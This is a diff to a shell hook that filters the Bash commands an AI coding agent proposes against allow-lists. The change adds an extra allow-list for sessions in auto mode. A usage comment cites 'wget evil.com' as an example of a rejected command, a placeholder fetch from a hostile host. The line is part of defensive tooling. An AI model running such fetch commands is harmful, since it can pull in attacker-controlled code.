@@ -6,6 +6,7 @@
 # Usage (called by the hook):
 # $ preToolUse-Bash-solkan "git status"     # exit 0 (allowed)
 # $ preToolUse-Bash-solkan "wget evil.com"  # exit 1 (rejected)
+# $ preToolUse-Bash-solkan "python3 x.py" /some/dir  # exit 0 if the ralph session of /some/dir runs in auto mode
 
 # Guard: skip if already defined (e.g. mocked in tests)
 whence preToolUse-Bash-solkan > /dev/null && return 0
@@ -23,6 +24,11 @@ function preToolUse-Bash-solkan() {
     --allow-list-file "${hookDir}/allow-list.json"
     --rewrite-list-file "${hookDir}/rewrite-list.json"
   )
+
+  # Extra allow-list when the ralph session of the directory runs in auto mode (a failing ralph-mode counts as not auto)
+  local ralphMode=""
+  ralphMode="$(ralph-mode "$2" 2>/dev/null)" || ralphMode=""
+  [[ "$ralphMode" == "auto" ]] && solkanArgs+=(--allow-list-file "${hookDir}/allow-list-auto.json")
 
   # Extra allow-list from repo-local config
   [[ -f "$localAllowList" ]] && solkanArgs+=(--allow-list-file "$localAllowList")
